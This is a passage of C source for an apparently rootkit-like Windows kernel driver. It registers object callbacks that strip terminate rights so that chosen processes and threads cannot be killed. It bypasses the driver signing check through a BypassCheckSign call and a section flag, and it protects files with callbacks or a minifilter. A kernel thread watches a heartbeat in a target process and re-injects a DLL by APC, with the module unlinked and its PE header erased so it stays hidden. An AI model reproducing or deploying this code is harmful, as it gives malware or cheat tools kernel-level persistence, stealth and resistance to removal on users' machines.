				pOperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
			}
		}
		if (pOperationInformation->Operation == OB_OPERATION_HANDLE_DUPLICATE)
		{
			//pOperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess=0;
			if ((pOperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & PROCESS_TERMINATE) == PROCESS_TERMINATE)
			{
				pOperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
			}
		}
	}
exit_sub:
	return OB_PREOP_SUCCESS;
}

OB_PREOP_CALLBACK_STATUS preCall2(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION pOperationInformation)
{
#define THREAD_TERMINATE2 0x1
	PEPROCESS ep;
	PETHREAD et;
	HANDLE pid;
	if (pOperationInformation->ObjectType != *PsThreadType)
		goto exit_sub;
	et = (PETHREAD)pOperationInformation->Object;
	ep = IoThreadToProcess(et);
	pid = PsGetProcessId(ep);
	UNREFERENCED_PARAMETER(RegistrationContext);
	if (IsProtectedProcessName(ep))
	{
		if (pOperationInformation->Operation == OB_OPERATION_HANDLE_CREATE)
		{
			//pOperationInformation->Parameters->CreateHandleInformation.DesiredAccess=0;
			if ((pOperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & THREAD_TERMINATE2) == THREAD_TERMINATE2)
			{
				pOperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~THREAD_TERMINATE2;
			}
		}
		if (pOperationInformation->Operation == OB_OPERATION_HANDLE_DUPLICATE)
		{
			//pOperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess=0;
			if ((pOperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & THREAD_TERMINATE2) == THREAD_TERMINATE2)
			{
				pOperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~THREAD_TERMINATE2;
			}
		}
	}
exit_sub:
	return OB_PREOP_SUCCESS;
}

NTSTATUS ObProtectProcess(BOOLEAN Enable)
{
	if (Enable == TRUE)
	{
		NTSTATUS obst1 = 0, obst2 = 0;
		OB_CALLBACK_REGISTRATION obReg, obReg2;
		OB_OPERATION_REGISTRATION opReg, opReg2;
		//reg ob callback 1
		memset(&obReg, 0, sizeof(obReg));
		obReg.Version = ObGetFilterVersion();
		obReg.OperationRegistrationCount = 1;
		obReg.RegistrationContext = NULL;
		RtlInitUnicodeString(&obReg.Altitude, L"321124");
		obReg.OperationRegistration = &opReg;
		memset(&opReg, 0, sizeof(opReg));
		opReg.ObjectType = PsProcessType;
		opReg.Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
		opReg.PreOperation = (POB_PRE_OPERATION_CALLBACK)&preCall1;
		obst1 = ObRegisterCallbacks(&obReg, &obHandle1);
		//reg ob callback 2
		memset(&obReg2, 0, sizeof(obReg2));
		obReg2.Version = ObGetFilterVersion();
		obReg2.OperationRegistrationCount = 1;
		obReg2.RegistrationContext = NULL;
		RtlInitUnicodeString(&obReg2.Altitude, L"321125");
		obReg2.OperationRegistration = &opReg2;
		memset(&opReg2, 0, sizeof(opReg2));
		opReg2.ObjectType = PsThreadType;
		opReg2.Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
		opReg2.PreOperation = (POB_PRE_OPERATION_CALLBACK)&preCall2;
		obst1 = ObRegisterCallbacks(&obReg2, &obHandle2);
		return NT_SUCCESS(obst1) & NT_SUCCESS(obst2);
	}
	else
	{
		if (obHandle1 != NULL)
			ObUnRegisterCallbacks(obHandle1);
		if (obHandle2 != NULL)
			ObUnRegisterCallbacks(obHandle2);
		return TRUE;
	}
}
/* process protection ends */
#endif

#ifdef _THREAD_INJECT_
KEVENT kEvent;
NTKERNELAPI UCHAR* PsGetProcessImageFileName(IN PEPROCESS Process);
NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE Id, PEPROCESS *Process);
typedef struct _DEVICE_EXTENSION {
	KEVENT evKill;//在设备扩展中声明一个KEVENT对象  
	PKTHREAD thread;
}*PDEVICE_EXTENSION, DEVICE_EXTENSION;
DEVICE_EXTENSION pdx;
PEPROCESS LookupProcess(HANDLE Pid) {
	PEPROCESS eprocess = NULL;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Pid, &eprocess))) {
		return eprocess;
	}
	else {
		return NULL;
	}
}
long GetPidByPName(char* PName) {
	long pid = INVALID_PID;
	ULONG i = 0;
	PEPROCESS eproc = NULL;
	for (i = 4; i < 1 << 18; i = i + 4) {
		eproc = LookupProcess((HANDLE)i);
		if (NULL != eproc) {
			ObDereferenceObject(eproc);
			/*
			*/
			if (!strcmp(PName, (char*)PsGetProcessImageFileName(eproc))) {
				pid = (long)((char*)PsGetProcessId(eproc) - (char*)0);
				break;
			}
		} // end of if( NULL != eproc )
	}
	return pid;
}
VOID MySleep(LONG msec)
{
	LARGE_INTEGER my_interval;
	my_interval.QuadPart = DELAY_ONE_MILLISECOND;
	my_interval.QuadPart *= msec;
	KeDelayExecutionThread(KernelMode, 0, &my_interval);
}
VOID MyThreadFunc(IN PVOID context)
{
	(void*)context;
	NTSTATUS status = STATUS_SUCCESS;
	INJECT_DLL data = { IT_Thread };
	PROTECT_MEMORY in;
	COPY_MEMORY cp;
	ULONG timeStamp_old;
	ULONG timeStamp_new;
	ULONG last_pid;

	
	timeStamp_old = timeStamp_new = 0;

	wcscpy_s(data.FullDllPath, 512, TARGET_DLL_FOR_INJECT);
	wcscpy_s(data.initArg, 512, L"");
	data.type = IT_Apc; // can't be IT_Thread nor IT_MMap
	data.initRVA = 0;
	data.wait = TRUE; // must be TRUE
	data.unlink = TRUE;
	data.erasePE = TRUE;

	in.base = HEART_BEAT_ADDRESS;
	in.size = sizeof(ULONG);
	in.newProtection = PAGE_READWRITE;

	cp.localbuf = &timeStamp_new;
	cp.targetPtr = HEART_BEAT_ADDRESS;
	cp.size = sizeof(ULONG);
	cp.write = FALSE;

	last_pid = GetPidByPName(TARGET_PNAME_1);
	last_pid = last_pid == INVALID_PID ? GetPidByPName(TARGET_PNAME_2) : last_pid;
	/*
	*/
	for (;;) {
		MySleep(INJECT_SPLIT * 1000);
		data.pid = GetPidByPName(TARGET_PNAME_1);
		data.pid = data.pid == INVALID_PID ? GetPidByPName(TARGET_PNAME_2) : data.pid;
		DbgPrint("[+] data.pid [%d]\n", data.pid);
		if (data.pid == INVALID_PID) continue;
		if (data.pid != last_pid) { // pid changed
			in.pid = data.pid;
			BBProtectMemory(&in);
		}
		cp.pid = data.pid;
		BBCopyMemory(&cp);
		DbgPrint("[+] wassup time stamp old new [%d] [%d]\n", timeStamp_old, timeStamp_new);
		if (timeStamp_old == timeStamp_new) { // heart not beating
			status = BBInjectDll(&data);
			DbgPrint("[+] return of inject [%d]\n", status);
		}
		timeStamp_old = timeStamp_new;
		last_pid = data.pid;
	}
/*
	*/

	/*
	MySleep(3000);
	KeSetEvent(&kEvent, 0, TRUE);
	PsTerminateSystemThread(STATUS_SUCCESS);
	*/
}
#endif

VOID _hijack(PDRIVER_OBJECT DriverObject) {
	NTSTATUS status = STATUS_SUCCESS;
	(void*)status;

	// [+] ---------- process protection ----------
#ifdef _PROCESS_PROTECTION_
	BypassCheckSign(DriverObject);
	ObProtectProcess(1);
#endif
	// [+] ---------- process protection ends ----------

	// [+] ---------- file protection ----------
#ifdef _FILE_PROTECTION_WAY_1_
	/* first way */
	OB_CALLBACK_REGISTRATION obReg;
	OB_OPERATION_REGISTRATION opReg;
	PLDR_DATA ldr;
	EnableObType(*IoFileObjectType);
	ldr = (PLDR_DATA)DriverObject->DriverSection;
	ldr->Flags |= 0x20;
	// init callbacks
	memset(&obReg, 0, sizeof(obReg));
	obReg.Version = ObGetFilterVersion();
	obReg.OperationRegistrationCount = 1;
	obReg.RegistrationContext = NULL;
	RtlInitUnicodeString(&obReg.Altitude, L"321000");
	obReg.OperationRegistration = &opReg;
	memset(&opReg, 0, sizeof(opReg));
	opReg.ObjectType = IoFileObjectType;
	opReg.Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
	opReg.PreOperation = (POB_PRE_OPERATION_CALLBACK)&preCall;
	status = ObRegisterCallbacks(&obReg, &obHandle);
	/* first way ends */
#endif
#ifdef _FILE_PROTECTION_WAY_2_
	/* second way */
	PSECURITY_DESCRIPTOR sd;
	OBJECT_ATTRIBUTES oa;
	UNICODE_STRING uniString;		//for communication port name
	status = FltRegisterFilter(DriverObject,
		&FilterRegistration,
		&g_pFilterHandle);
	ASSERT(NT_SUCCESS(status));
	if (NT_SUCCESS(status))
	{
		status = FltStartFiltering(g_pFilterHandle);
		if (!NT_SUCCESS(status))
		{
			FltUnregisterFilter(g_pFilterHandle);
		}
	}
_Exit_DriverEntry:
	if (!NT_SUCCESS(status))
	{
		if (NULL != g_pFilterHandle)
		{
			FltUnregisterFilter(g_pFilterHandle);
			g_pFilterHandle = NULL;
		}
	}
	/* second way ends */
#endif
	// [+] ---------- file protection ends ----------


	// [+] ---------- Thread Inject ----------
#ifdef _THREAD_INJECT_
	//#if 0
	HANDLE hThread;
	// KeInitializeEvent(&kEvent, SynchronizationEvent, FALSE);
	KeInitializeEvent(&pdx.evKill, NotificationEvent, FALSE);
	status = PsCreateSystemThread(&hThread, 0, NULL, NULL, NULL, MyThreadFunc,
		NULL);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("PsCreateSystemThread failed!");
		return;
	}
	ObReferenceObjectByHandle(hThread,        //为了等待线程终止，你需要KTHREAD对象的地址来代替从PsCreateSystemThread获得的线程句柄。  
		THREAD_ALL_ACCESS,  //调用ObReferenceObjectByHandle获得这个地址。  
		NULL,
		KernelMode,
		(PVOID*)&pdx.thread,
		NULL);
	ZwClose(hThread);
	/*KeWaitForSingleObject(&kEvent, Executive, KernelMode, FALSE, NULL);*/
#endif
	// [+] ---------- Thread Inject ends ----------
}

VOID _hijack_Unload()
{
	// [+] ---------- Thread Inject ----------
#ifdef _THREAD_INJECT_
	KeSetEvent(&pdx.evKill, 0, FALSE);
	KeWaitForSingleObject(pdx.thread, Executive, KernelMode, FALSE, NULL);
	ObDereferenceObject(pdx.thread);
#endif
	// [+] ---------- Thread Inject ends ----------

	// [+] ---------- file protection ends ----------
#ifdef _FILE_PROTECTION_WAY_2_
	/* file protection : second way  */
	PAGED_CODE();
	FltUnregisterFilter(g_pFilterHandle);
	DbgPrint("[MiniFilter][DriverUnload]\n");
	/* file protection : second way ends */
#endif
#ifdef _FILE_PROTECTION_WAY_1_
	/* file protection : first way  */
	ObUnRegisterCallbacks(obHandle);
	/* file protection : first way ends */
#endif
	// [+] ---------- file protection ends ----------

#ifdef _PROCESS_PROTECTION_
	/* process protection */
	ObProtectProcess(0);
	/* process protection ends */
#endif
}